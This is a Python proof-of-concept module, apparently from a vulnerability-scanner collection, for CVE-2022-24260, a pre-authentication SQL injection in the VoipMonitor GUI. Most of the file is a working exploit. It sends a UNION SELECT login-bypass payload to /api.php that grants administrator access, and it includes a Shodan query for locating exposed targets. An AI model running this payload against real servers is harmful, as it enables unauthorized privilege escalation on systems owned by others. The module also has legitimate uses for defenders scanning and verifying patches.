import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''VoipMonitor - Pre-Auth SQL Injection''',
        "description": '''A SQL injection vulnerability in Voipmonitor GUI before v24.96 allows attackers to escalate privileges to the Administrator level.''',
        "severity": "critical",
        "references": [
            "https://kerbit.io/research/read/blog/3", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-24260", 
            "https://www.voipmonitor.org/changelog-gui?major=5"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "9.8",
            "cve-id": "CVE-2022-24260",
            "cwe-id": "CWE-89"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.title:"VoIPmonitor"'''
        },
        "tags": ["cve", "cve2022", "voipmonitor", "sqli", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/api.php'
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"

        resp = requests.post(url+path, headers=headers, data=data, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and '"success":true' in resp.text and '_vm_version' in resp.text and '_debug' in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url